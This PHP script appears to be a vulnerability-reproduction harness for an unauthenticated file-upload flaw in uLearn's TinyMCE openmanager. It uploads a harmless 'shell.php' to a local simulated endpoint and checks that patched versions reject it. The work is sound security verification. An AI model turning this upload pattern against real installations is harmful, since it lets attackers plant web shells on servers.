<?php
require __DIR__ . '/vulnerable_app/openmanager_upload_sim.php';

function rrmdir(string $dir): void
{
    if (!is_dir($dir)) return;
    foreach (scandir($dir) as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        is_dir($path) ? rrmdir($path) : unlink($path);
    }
    rmdir($dir);
}

function dump_json(string $label, mixed $value): void
{
    echo $label . "\n" . json_encode($value, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES) . "\n";
}

$runtime = __DIR__ . '/runtime_ulearn_openmanager';
rrmdir($runtime);
$scriptDir = $runtime . '/openmanager/php';
$uploadRoot = $runtime . '/openmanager/uploads/';
mkdir($scriptDir, 0777, true);
mkdir($uploadRoot, 0777, true);

$tmpPayload = tempnam(sys_get_temp_dir(), 'ulearn-poc-');
$payloadContent = "<?php echo 'ULEARN_OPENMANAGER_POC'; ?>";
file_put_contents($tmpPayload, $payloadContent);

$post = [
    'uploadfolder' => 'uploads/',
    'mediatype' => 'media',
];
$file = [
    'name' => 'shell.php',
    'tmp_name' => $tmpPayload,
];

echo "[*] PoC context:\n";
dump_json('', [
    'finding' => 'safytech/ulearn CAND-1cceb622460f',
    'vulnerability' => 'Unauthenticated unrestricted file upload in TinyMCE openmanager fileactions.php',
    'safety' => 'Local-only. Writes to a container runtime directory only.',
]);

echo "\n[*] Attack: unauthenticated uploadfile request with userfile=shell.php and mediatype=media.\n";
$result = vulnerable_openmanager_upload($post, $file, $scriptDir);
dump_json('[*] Vulnerable upload result:', $result + [
    'exists' => isset($result['destination']) ? file_exists($result['destination']) : false,
    'extension' => isset($result['destination']) ? pathinfo($result['destination'], PATHINFO_EXTENSION) : null,
    'content' => isset($result['destination']) && file_exists($result['destination']) ? file_get_contents($result['destination']) : null,
]);
if (empty($result['ok']) || !file_exists($result['destination']) || pathinfo($result['destination'], PATHINFO_EXTENSION) !== 'php' || file_get_contents($result['destination']) !== $payloadContent) {
    fwrite(STDERR, "[FAIL] Expected vulnerable upload to write shell.php under media/.\n");
    exit(1);
}
echo "[PASS] Vulnerability reproduced: unauthenticated uploader wrote a PHP file under the public media path.\n";

echo "\n[*] Control: same shell.php against patched path without authentication.\n";
$tmpPayload2 = tempnam(sys_get_temp_dir(), 'ulearn-poc-');
file_put_contents($tmpPayload2, $payloadContent);
$blockedAuth = patched_openmanager_upload($post, ['name' => 'shell.php', 'tmp_name' => $tmpPayload2], $scriptDir, false);
dump_json('[*] Patched unauthenticated result:', $blockedAuth);
if (($blockedAuth['status'] ?? null) !== 401) {
    fwrite(STDERR, "[FAIL] Patched path should require authentication.\n");
    exit(1);
}
@unlink($tmpPayload2);
echo "[PASS] Patched auth control passed.\n";

echo "\n[*] Control: authenticated patched path with CSRF token but .php extension.\n";
$tmpPayload3 = tempnam(sys_get_temp_dir(), 'ulearn-poc-');
file_put_contents($tmpPayload3, $payloadContent);
$blockedExt = patched_openmanager_upload($post + ['_token' => 'valid-csrf-token'], ['name' => 'shell.php', 'tmp_name' => $tmpPayload3], $scriptDir, true);
dump_json('[*] Patched disallowed-extension result:', $blockedExt);
if (($blockedExt['status'] ?? null) !== 400) {
    fwrite(STDERR, "[FAIL] Patched path should reject .php extension.\n");
    exit(1);
}
@unlink($tmpPayload3);
echo "[PASS] Patched extension control passed.\n";

echo "\nVULNERABLE: ulearn CAND-1cceb622460f reproduced successfully.\n";
